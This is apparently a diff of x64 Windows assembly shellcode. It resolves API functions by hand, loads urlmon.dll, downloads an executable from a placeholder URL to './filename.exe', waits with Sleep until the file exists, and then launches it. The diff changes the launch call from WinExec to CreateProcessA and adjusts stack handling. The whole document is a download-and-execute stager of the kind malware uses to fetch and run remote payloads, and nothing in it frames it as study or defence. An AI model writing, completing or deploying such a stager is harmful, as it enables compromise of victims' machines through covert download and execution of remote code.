@@ -29,7 +29,10 @@ section .text
     add rdx, functionName
     mov r8, 15
     call getFunction
+
+
     mov r12, [r12d + 0x30]
+    sub rsp, 0x8
     push r12
     mov r13, rax          ; r13 = GetProcAddress
     mov rcx, r12
@@ -42,6 +45,10 @@ section .text
     mov rcx, r15
     add rcx, dll1
     call r14              ; Load urlmon.dll
+
+
+
+
     mov rcx, rax
     mov rdx, r15
     add rdx, downloadF
@@ -52,6 +59,7 @@ section .text
     mov r8, r15
     add r8, filename
     xor r9, r9
+    sub rsp, 3*8
     push r9
     call rax              ; Download &url to &filename
     add rsp, 8            ; Clear parameters from stack
@@ -75,6 +83,7 @@ section .text
     mov r12, rax
     mov rdx, r15
     add rdx, sleepF
+    sub rsp, 0x8        ; Align stack
     call r13
     mov rdi, rax        ; Sleep function
     xor rbx, rbx
@@ -91,16 +100,23 @@ section .text
       mov rbx, rax
       jmp downloadCheck
       done:
-        pop rcx                 ; kernel32.dll
+        mov rcx, 0x7ff802890000 ; Kernel32.dll
         mov rdx, r15
-        add rdx, execF          ; WinExec
+        add rdx, execF          ; CreateProcessA
         call r13
         mov rcx, r15
         add rcx, filename
-        mov rdx, 0
+	mov rdx, 0x0
+	mov r8, 0x0
+	mov r9, 0x0
+	push 0x1
+	push 0x0
+	push 0x0
+	push 0x0
+	push 0x0
+	push 0x0
         call rax
-        jmp end
-    
+    	int3
   
   getFunction:
     push rbp
@@ -191,5 +207,5 @@ section .data
   sleepF db "Sleep", 0
   url db "https://UrlToAFile.com", 0
   filename db "./filename.exe", 0
-  execF db "WinExec", 0
+  execF db "CreateProcessA", 0
   end
